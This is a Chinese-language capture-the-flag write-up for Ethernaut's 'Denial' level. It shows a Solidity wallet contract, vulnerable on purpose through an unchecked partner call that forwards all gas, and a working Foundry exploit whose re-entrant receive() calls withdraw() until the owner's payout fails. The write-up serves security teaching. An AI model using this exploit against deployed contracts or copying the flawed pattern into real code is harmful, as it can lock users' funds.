# Level 20 - Denial
## 題目
[Denial](https://ethernaut.openzeppelin.com/level/0x2427aF06f748A6adb651aCaB0cA8FbC7EaF802e6)

### 通關條件
這是一個簡單的錢包，隨著時間的推移，資金會逐漸流失。您可以透過成為提款合夥人慢慢提款。
如果您可以在所有者調用時拒絕所有者提取資金 `withdraw()`（同時合約仍然有資金，並且交易的 Gas 量為 1M 或更少），您將贏得此級別。
### 合約內容
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
## 解題
這一題也是要讓別人提款失敗，跟 [Level 9 - King](https://hackmd.io/@D13/ethernaut9) 一樣，也就是 DoS 這個合約。
合約中有一個提款的 function `withdraw()`，他會把款項轉給 partner 跟 owner，然後第 10 行可以將 partner 改成自己。
接著我們在自己的合約中設計 `receive()` 會再次呼叫關卡的 `withdraw()`，導致提款功能不能繼續下去；owner 就無法領到錢，所以這題的攻擊思路就是：
1. 設計 `receive()` 中重新呼叫關卡的 `withdraw()`
2. 呼叫關卡的 `setWithdrawPartner(address _partner)` 將 `partner` 改為自己
3. 呼叫關卡的 `withdraw()`，成功 DoS
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/20_Denial.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();
        DenialAttack denialAttack = new DenialAttack();
        denialAttack.attack();
        vm.stopBroadcast();
    }
}

contract DenialAttack {
    Denial level20 = Denial(payable(your_challenge_address));

    function attack() public {
        level20.setWithdrawPartner(address(this));
    }

    receive() external payable {
        level20.withdraw();
    }
}
```
